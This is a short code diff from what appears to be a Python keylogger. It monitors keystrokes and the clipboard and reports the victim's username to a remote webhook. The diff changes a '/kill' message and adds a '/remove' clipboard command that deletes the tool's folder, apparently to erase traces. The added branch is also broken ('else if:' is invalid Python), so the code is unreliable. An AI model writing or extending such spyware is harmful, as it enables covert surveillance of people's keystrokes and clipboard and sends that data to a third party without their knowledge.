@@ -94,11 +94,16 @@ def on_release(key):
     current_clipboard = ""
     current_clipboard = pyperclip.paste()
     if "/kill" in current_clipboard:
-        send_to_webhook(f"Connection stopped by user: {username}")
+        send_to_webhook(f"Kill command executed by: {username}")
         file_path = rf"C:\users\{username}\kl2.1"  # Fixed the file path
         subprocess.run(["explorer", file_path])
         time.sleep(1)
         send_to_webhook(f"Opened dir...")
+        return False
+    else if: "/remove" in current_clipboard:
+        send_to_webhook(f"Removed by: {username}")
+        file_path = rf"C:\users\{username}\kl2.1"
+        os.rmdir(file_path)
         return False
 
 def monitor_clipboard():
